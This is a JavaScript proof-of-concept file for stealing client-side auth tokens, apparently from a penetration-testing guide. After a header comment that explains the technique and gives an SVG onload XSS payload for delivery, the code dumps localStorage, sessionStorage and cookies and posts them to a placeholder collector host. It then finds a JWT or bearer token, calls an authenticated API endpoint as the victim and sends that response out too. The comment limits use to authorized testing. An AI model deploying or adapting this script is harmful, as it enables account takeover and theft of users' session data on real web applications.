/*
 * token_exfil.js — Client-side token theft PoC (guide §25).
 * Modern SPAs keep JWT / OAuth access & refresh tokens in localStorage/sessionStorage, which
 * is ALWAYS JS-readable (HttpOnly does not apply). A stolen Bearer/refresh token lets you call
 * the API AS THE VICTIM from your own machine — often the real crown jewel.
 *
 * AUTHORIZED TESTING ONLY. Run against YOUR OWN test account; prove impact by making ONE
 * authenticated API call (e.g. GET /api/me) with the exfiltrated token and showing your own
 * account's data. Do NOT steal real users' tokens.
 *
 * Deliver via, e.g.:   <svg onload="import('//YOUR.oast.fun/token_exfil.js')">
 */
(function () {
  var CFG = {
    collector: "//YOUR.oast.fun/t",
    proveWith: "/api/me"   // authenticated endpoint to demo impact; set "" to skip
  };

  function dumpStore(store) {
    var out = {};
    try {
      for (var i = 0; i < store.length; i++) {
        var k = store.key(i);
        out[k] = store.getItem(k);
      }
    } catch (e) {}
    return out;
  }

  function findBearer(obj) {
    // Heuristic: pick a value that looks like a JWT or an access token.
    for (var k in obj) {
      var v = obj[k];
      if (typeof v !== "string") continue;
      if (/^ey[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\./.test(v)) return v;          // raw JWT
      if (/access|bearer|id_?token|auth/i.test(k) && v.length > 20) return v; // named token
      try {
        var o = JSON.parse(v);
        if (o && (o.access_token || o.accessToken || o.token)) return o.access_token || o.accessToken || o.token;
      } catch (e) {}
    }
    return null;
  }

  var loot = {
    url: location.href,
    domain: document.domain,
    localStorage: dumpStore(window.localStorage),
    sessionStorage: dumpStore(window.sessionStorage),
    cookie: document.cookie
  };

  // 1) Exfil the stored material to your collaborator
  try {
    fetch(CFG.collector, { method: "POST", mode: "no-cors", body: JSON.stringify(loot) });
  } catch (e) {
    new Image().src = CFG.collector + "?d=" + encodeURIComponent(JSON.stringify(loot));
  }

  // 2) OPTIONAL impact demonstration: call an authed endpoint with the token and exfil the result.
  if (CFG.proveWith) {
    var token = findBearer(loot.localStorage) || findBearer(loot.sessionStorage);
    if (token) {
      try {
        fetch(CFG.proveWith, { headers: { Authorization: "Bearer " + token }, credentials: "include" })
          .then(function (r) { return r.text(); })
          .then(function (body) {
            fetch(CFG.collector + "?proof=1", { method: "POST", mode: "no-cors", body: body.slice(0, 4000) });
          })
          .catch(function () {});
      } catch (e) {}
    }
  }
})();
